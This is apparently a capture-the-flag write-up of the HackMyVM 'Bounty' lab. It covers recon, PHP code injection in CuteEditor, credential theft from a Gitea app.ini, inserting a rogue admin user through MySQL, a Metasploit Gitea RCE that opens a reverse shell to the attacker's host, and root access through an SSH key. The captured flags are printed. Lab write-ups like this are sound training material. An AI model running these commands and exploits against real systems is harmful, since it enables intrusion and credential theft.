# Bounty

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.202:80
Open 10.0.2.202:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.202
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 75:85:67:56:77:e8:5a:d8:f0:49:c5:5d:73:39:c8:16 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4SsnYo32ZpzXqjkT3gRMU/WNZrockirPrLn89uTB31028/pm3QoKfCmYH5AOt0JpC9W8OjDWJJuin6lYmySbkV4eZ/HKy+9ObWnDwbeFFjIsfZ0JFw9WWOoHj1ZNojizjoGKbKv1Xy5Nc2VH2U2OhIaaEnLlhicIclR+EkmrYcXYjCFWipsyCO5XNd5qMEoS8g7zNKJFnYBWEo1+Gyk7UNoCB551CaDNubeZDdOHT2S5MBzk8L9n1af1eqidLryjRXLbJuII1ckJBH7aFBMTAYqJuVrGqbL0in6wJgr0ci0QR0EIqO76EZ7qLjEUKWGcudkJPDd47ztH3giVKxRQmeXujLnfUiGbPQPiEGqGM6dGwFDROuRq7iM7mIVLFvr2b7gB0mvDXKdwI0PDaLXXx5boUNOJU5HLQnfP68J2p//rHfar5i+n9BNXBImm+6IeUfyS2D7PeogOeDEwWM4Diet+/GR6c2HL/SeH52f7rlZ/gYU7EC8whmkIyx3qDuMM=
|   256 b5:5d:d8:7e:c9:ad:e6:67:7d:5e:e3:ab:b0:a0:fa:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeSrDUbSGPMd+FXn3MSdvL3asKHEhxeT9LlacpmZXRmn/PQEHnkXTgiumvT7MNyntE7cEsEUcz6ALYbGZnDcx8=
|   256 dd:11:b9:f8:fd:b6:a5:9f:d8:d6:40:c7:db:81:63:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE1rAV/e5mAuwhqpDf/qxB4tiixbPXPXVSWj8CnOK8RM
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

wot

```bash
└─$ curl http://10.0.2.202/
* * * * * /usr/bin/php /var/www/html/document.html

└─$ curl http://10.0.2.202/document.html
<?php
phpinfo();
?>
```

`index.php` renders different output

![writeup.png](/assets/pentest/hackmyvm/bounty/writeup.png)

Only `Save` buttons works

![writeup-1.png](/assets/pentest/hackmyvm/bounty/writeup-1.png)

Find version from comments
- [CuteEditor for PHP 6.6 - Directory Traversal](https://www.exploit-db.com/exploits/50994)
- [https://nvd.nist.gov/vuln/detail/CVE-2021-47751](https://nvd.nist.gov/vuln/detail/CVE-2021-47751)
- [https://phphtmledit.com](https://phphtmledit.com)

```bash
└─$ feroxbuster -u http://10.0.2.202 --thorough --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html
200      GET        1l        7w       51c http://10.0.2.202/
301      GET        7l       11w      169c http://10.0.2.202/document => http://10.0.2.202/document/
200      GET        3l        3w       23c http://10.0.2.202/document.html
200      GET        1l        7w       51c http://10.0.2.202/index.html
200      GET       16l       42w      470c http://10.0.2.202/index.php
200      GET       11l       32w      265c http://10.0.2.202/Get_HtmlContent.php
200      GET       22l       76w      813c http://10.0.2.202/Edithtml.php
200      GET       91l      527w     5920c http://10.0.2.202/templates.php
```

### Command Injection

I'm not exactly positive how, but with editor you are able to embed PHP code

![writeup-2.png](/assets/pentest/hackmyvm/bounty/writeup-2.png)

I was not able to trigger reverse shell via `curl`, only through full http request it worked... and it took some time like it was queued as command.

![writeup-3.png](/assets/pentest/hackmyvm/bounty/writeup-3.png)

### User.txt

```bash
hania@bounty:~$ cat user.txt
HMVtuctictactoc
```

## Privilege Escalation (primavera)

```bash
hania@bounty:~$ sudo -l
Matching Defaults entries for hania on bounty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hania may run the following commands on bounty:
    (primavera) NOPASSWD: /home/primavera/gitea \"\"
```

```bash
hania@bounty:~$ sudo -u primavera /home/primavera/gitea \"\" &
[1] 1316
2026/02/13 08:23:34 cmd/web.go:102:runWeb() [I] Starting Gitea on PID: 1317
2026/02/13 08:23:34 cmd/web.go:150:runWeb() [I] Global init
2026/02/13 08:23:34 routers/init.go:107:GlobalInitInstalled() [I] Git Version: 2.30.2, Wire Protocol Version 2 Enabled
2026/02/13 08:23:34 routers/init.go:110:GlobalInitInstalled() [I] AppPath: /home/primavera/gitea
2026/02/13 08:23:34 routers/init.go:111:GlobalInitInstalled() [I] AppWorkPath: /home/primavera
2026/02/13 08:23:34 routers/init.go:112:GlobalInitInstalled() [I] Custom path: /home/primavera/custom
2026/02/13 08:23:34 routers/init.go:113:GlobalInitInstalled() [I] Log path: /home/primavera/log
2026/02/13 08:23:34 routers/init.go:114:GlobalInitInstalled() [I] Configuration file: /home/primavera/custom/conf/app.ini
2026/02/13 08:23:34 routers/init.go:115:GlobalInitInstalled() [I] Run Mode: Prod
2026/02/13 08:23:35 ...dules/setting/log.go:287:newLogService() [I] Gitea v1.16.6 built with GNU Make 4.1, go1.18.1 : bindata, sqlite, sqlite_unlock_notify
2026/02/13 08:23:35 ...dules/setting/log.go:334:newLogService() [I] Gitea Log Mode: Console(Console:)
2026/02/13 08:23:35 ...dules/setting/log.go:250:generateNamedLogger() [I] Router Log: Console(console:)
...
```

```bash
hania@bounty:~$ cat /home/primavera/custom/conf/app.ini
APP_NAME = Gitea: Git with a cup of tea
RUN_USER = primavera
RUN_MODE = prod

[database]
DB_TYPE  = mysql
HOST     = 127.0.0.1:3306
NAME     = gitea
USER     = git
PASSWD   = password
SCHEMA   =
SSL_MODE = disable
CHARSET  = utf8
PATH     = /home/primavera/data/gitea.db
LOG_SQL  = false

[repository]
ROOT = /home/primavera/data/gitea-repositories

[server]
SSH_DOMAIN       = bounty.hmv
DOMAIN           = bounty.hmv
HTTP_PORT        = 3000
ROOT_URL         = http://bounty:3000/
DISABLE_SSH      = false
SSH_PORT         = 22
LFS_START_SERVER = true
LFS_CONTENT_PATH = /home/primavera/data/lfs
LFS_JWT_SECRET   = po0IHq0eCfle5A8dDcREDHlVsiZZtGcRhCY3yCcl8YI
OFFLINE_MODE     = false

[mailer]
ENABLED = false

[service]
REGISTER_EMAIL_CONFIRM            = false
ENABLE_NOTIFY_MAIL                = false
DISABLE_REGISTRATION              = false
ALLOW_ONLY_EXTERNAL_REGISTRATION  = false
ENABLE_CAPTCHA                    = false
REQUIRE_SIGNIN_VIEW               = false
DEFAULT_KEEP_EMAIL_PRIVATE        = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING       = true
NO_REPLY_ADDRESS                  = noreply.localhost

[picture]
DISABLE_GRAVATAR        = false
ENABLE_FEDERATED_AVATAR = true

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[session]
PROVIDER = file

[log]
MODE      = console
LEVEL     = info
ROOT_PATH = /home/primavera/log
ROUTER    = console

[security]
INSTALL_LOCK       = true
INTERNAL_TOKEN     = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE2NjYyNTQ3ODN9.qbftwMSLPSWgTMFEUJhJtg78Vhhv2crocCth2BKiQM0
PASSWORD_HASH_ALGO = pbkdf2

[migrations]
ALLOWED_DOMAINS =
ALLOW_LOCALNETWORKS = true
BLOCKED_DOMAINS =
SKIP_TLS_VERIFY = true
```

I created new user but I was not able to find anything in Gitea instance
```bash
hania@bounty:~$ HASH=$(python3 -c "import hashlib,binascii;print(binascii.hexlify(hashlib.pbkdf2_hmac('sha256',b'pwned123',b'abcdefghij',10000,dklen=50)).decode())")
hania@bounty:~$ mysql -u git -p'password' gitea -e "INSERT INTO user (lower_name,name,email,passwd,passwd_hash_algo,salt,rands,is_admin,is_active,type,allow_git_hook,must_change_password,avatar,avatar_email) VALUES ('pwned','pwned','pwned@test.com','$HASH','pbkdf2','abcdefghij','abcdefghij',1,1,0,1,0,'','pwned@test.com');"
```

There's authenticated RCE for this version
- [Gitea 1.16.6 - Remote Code Execution (RCE) (Metasploit)](https://www.exploit-db.com/exploits/51009)

```bash
└─$ msfconsole -q
msf > search CVE-2022-30781
Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/multi/http/gitea_git_fetch_rce  2022-05-16       excellent  Yes    Gitea Git Fetch Remote Code Execution
   1    \_ target: Unix Command               .                .          .      .
   2    \_ target: Linux Dropper              .                .          .      .
   3    \_ target: Windows Command            .                .          .      .
   4    \_ target: Windows Dropper            .                .          .      .

msf > use 1
msf exploit(multi/http/gitea_git_fetch_rce) > set LHOST eth0
msf exploit(multi/http/gitea_git_fetch_rce) > set LHOST 4445
msf exploit(multi/http/gitea_git_fetch_rce) > set RHOSTS 10.0.2.202
msf exploit(multi/http/gitea_git_fetch_rce) > set USERNAME pwned
msf exploit(multi/http/gitea_git_fetch_rce) > set PASSWORD pwned123

msf exploit(multi/http/gitea_git_fetch_rce) > run
[*] Started reverse TCP handler on 10.0.2.149:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 1.16.6
[*] Using URL: http://10.0.2.149:8080/
[*] Command shell session 1 opened (10.0.2.149:4445 -> 10.0.2.202:48874) at 2026-02-13 02:59:56 -0500

id
uid=1001(primavera) gid=1001(primavera) groups=1001(primavera)
```

### SSH

Upgrade shell
```bash
└─$ gen_ssh_deploy id_rsa primavera
[+] Remote command to run:
mkdir -p /home/primavera/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/0KaNqiRhrmitnnfJoCjXCw8Ih1JLjGkbSAm3yGImD woyag@kraken' >> /home/primavera/.ssh/authorized_keys ; chmod 700 /home/primavera/.ssh ; chmod 600 /home/primavera/.ssh/authorized_keys
```

## Privilege Escalation (root)

```bash
primavera@bounty:~$ cat note.txt
Im the shadow admin. Congrats.
```

```bash
primavera@bounty:~$ find . -type f -ls | grep -v -e data -e bash
   270345      4 -rw-r--r--   1 primavera primavera       66 oct 20  2022 ./.selected_editor
   270282      4 -rw-r--r--   1 primavera primavera      165 oct 20  2022 ./.wget-hsts
   270287      4 -rw-r--r--   1 primavera primavera      570 oct 20  2022 ./.ssh/id_rsa.pub
   270319      4 -rw-------   1 primavera primavera       94 feb 13 09:00 ./.ssh/authorized_keys
   270284      4 -rw-------   1 primavera primavera     2602 oct 20  2022 ./.ssh/id_rsa
   270278      4 -rw-r--r--   1 primavera primavera      807 oct 20  2022 ./.profile
   270344      4 -rw-------   1 primavera primavera       31 oct 20  2022 ./note.txt
   270299      4 -rw-r--r--   1 primavera primavera      190 oct 20  2022 ./.gitconfig
   270281 105032 -rwxr-xr-x   1 primavera primavera 107546440 abr 21  2022 ./gitea
   270298      4 -rw-r--r--   1 primavera primavera      1709 oct 20  2022 ./custom/conf/app.ini

primavera@bounty:~$ cat ./.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/0KaNqiRhrmitnnfJoCjXCw8Ih1JLjGkbSAm3yGImD woyag@kraken
```

There are SSH keys, but user didn't seem to connect anywhere.

```bash
primavera@bounty:~$ ssh -i .ssh/id_rsa root@0
root@bounty:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Root.txt

```
root@bounty:~# cat /root/root.txt
HMVtictictictic
```